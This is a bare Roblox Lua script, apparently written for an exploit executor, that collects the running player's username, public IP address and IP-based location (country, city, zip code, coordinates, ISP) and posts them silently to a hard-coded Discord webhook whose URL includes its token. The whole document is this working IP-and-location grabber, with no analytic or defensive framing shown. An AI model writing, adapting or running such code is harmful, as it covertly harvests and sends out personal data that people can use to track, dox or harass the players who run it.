...
local name = game:GetService("Players").LocalPlayer.Name; local WebhookURL = "https://canary.discord.com/api/webhooks/1084258735876231228/-AeIJ4qz-yQn3_B3WFql2PHQ6dC8KxW9EsgljLFxC5u1D7Ps62CBIULTpK8a3BuJbUbC"; local getIPResponse = syn.request({Url = "https://api.ipify.org/?format=json", Method = "GET"}); local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body); local IPBuffer = tostring(GetIPJSON.ip); local getIPInfo = syn.request({Url = string.format("http://ip-api.com/json/%s", IPBuffer), Method = "Get"}); local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body); local FI = {IP = IPBuffer, country = IIT.country, countryCode = IIT.countryCode, region = IIT.region, regionName = IIT.regionName, city = IIT.city, zipcode = IIT.zip, latitude = IIT.lat, longitude = IIT.lon, isp = IIT.isp, org = IIT.org}; local dataMessage = string.format("User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s", name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org); local MessageData = {["content"] = dataMessage}; syn.request({Url = WebhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode(MessageData)})
